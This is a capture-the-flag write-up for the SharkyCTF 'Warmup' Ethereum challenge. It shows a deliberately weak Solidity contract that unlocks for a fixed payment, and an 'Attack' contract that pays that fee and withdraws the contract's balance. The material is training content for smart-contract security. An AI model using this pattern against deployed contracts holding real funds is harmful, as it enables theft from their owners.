# Warmup

## Setup

The challenge is available at http://ethereum.sharkyctf.xyz/level/0

Before starting, it is recommended to follow the suggested steps at http://ethereum.sharkyctf.xyz/help to setup Metamask, get Ether from a Ropsten faucet, and Remix IDE.

## Challenge

The contract to attack is the following :

```solidity
pragma solidity = 0.4.25;

contract Warmup {
    bool public locked;
    
    constructor() public payable {
        locked = true;
    }
    
    function unlock() public payable {
        require(msg.value == 0.005 ether);
        locked = false;
    }
    
    function withdraw() public payable {
        require(!locked);
        msg.sender.call.value(address(this).balance)();
    }
}
```

The goal is then to be able to call `withdraw()` from the contract.

## Hint

There is no special trick for this challenge, you just need to call unlock with the right value.

## Solution

This challenge is just a warmup to see how to use Remix.

To attack this contract, we will create another contract called Attack, which will be called to attack the first contract.

In the same Solidity file, add the following code :

```
contract Attack {
    Warmup public target;
    
     constructor (address _adress) public {
        target = Warmup(_adress);
    }
    
    function attack() public payable {
        
        // We send the 0.005 ether to the target
        target.unlock.value(0.005 ether)();
        
        // Once it is unlocked we withdraw the money;
        target.withdraw();
    }
}
```

The code is pretty straightforward, we initialize the Attack contract with the address of the targeted contract, then we call the method `attack()`, with a value of 1 ether for example. The `attack()` method will then send the 0.005 ether needed by the targeted contract to unlock, and afterwards we simply withdraw the funds.